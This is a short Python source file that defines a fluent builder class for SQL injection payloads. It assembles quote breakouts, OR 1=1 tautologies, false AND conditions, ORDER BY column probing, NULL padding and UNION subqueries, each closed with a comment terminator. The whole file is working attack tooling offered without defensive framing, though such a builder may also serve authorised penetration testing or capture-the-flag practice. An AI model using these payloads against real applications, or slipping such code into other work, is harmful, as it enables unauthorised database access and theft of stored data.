class SQLInjectionBuilder:
    def __init__(self, start_str = None) -> None:
        if start_str != None:
            self.final_string = start_str
        else:
            self.final_string = ""

    def build(self):
        self.final_string += "; -- "
        return self.final_string

    def __str__(self) -> str:
        return self.final_string
    
    def add_nulls(self, num):
        self.final_string += ", NULL" * num
        return self

    def add_single_quote(self):
        self.final_string += "'"
        return self
    
    def add_str(self, string):
        self.final_string += string
        return self

    def or_boolean_one_equals_one_quoted(self):
        self.final_string += " OR 1=\"1\""
        return self

    def or_boolean_one_equals_one_unquoted(self):
        self.final_string += " OR 1=1"
        return self

    def and_false_condition(self) -> None:
        self.final_string += " AND 1=\"2\""
        return self

    def and_condition(self, subquery: str) -> None:
        self.final_string += f" AND {subquery}"
        return self

    def or_condition(self, subquery: str) -> None:
        self.final_string += f" OR {subquery}"
        return self

    def order_by(self, num) -> None:
        self.final_string += f" ORDER BY {num}"
        return self

    def union_subquery(self, subquery: str) -> None:
        self.final_string += f" UNION {subquery}"
        return self
